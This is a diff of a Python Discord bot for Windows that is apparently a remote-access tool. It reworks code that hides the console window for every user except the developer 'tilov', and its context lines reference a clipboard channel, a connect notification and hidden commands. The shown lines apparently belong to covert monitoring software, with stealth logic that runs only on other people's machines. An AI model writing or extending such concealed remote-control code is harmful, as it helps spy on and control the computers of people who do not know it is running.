@@ -45,10 +45,15 @@ DEV = "tilov"
 import win32gui
 import win32con
 import os
+import ctypes
 
 if not os.getlogin() == DEV:
-    own_window = ctypes.windll.kernel32.GetConsoleWindow()
-    win32gui.ShowWindow(own_window, win32con.SW_HIDE)
+    # Das Skript als aktives Fenster setzen
+    win32gui.SetForegroundWindow(ctypes.windll.kernel32.GetConsoleWindow())
+
+    # Das aktuelle aktive Fenster schließen
+    console_window = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(console_window, win32con.SW_HIDE) # Das Konsolenfenster ausblenden
 else: print("skipping exit")
 
 ################################################################################
@@ -178,11 +183,6 @@ async def on_ready():
     global clipboard_channel
 
     print(f'We have logged in as {bot.user}')
-    try:
-        synced = await bot.tree.sync()
-        print(f"Synced {len(synced)} command(s)")
-    except Exception as e:
-        print(e)
 
     if not notification_sent:
         guild = bot.guilds[0]  # Get the first guild the bot is connected to
@@ -519,7 +519,7 @@ async def help(ctx, category: str = None):
     else:
         commands = sorted([command for command in bot.commands if command.name != "help" and command.name not in hidden_commands], key=lambda x: x.name)
 
-    chunks = [commands[i:i + 20] for i in range(0, len(commands), 20)]
+    chunks = [commands[i:i + 15] for i in range(0, len(commands), 15)]
     total_commands = len(commands)
 
     for idx, chunk in enumerate(chunks, 1):
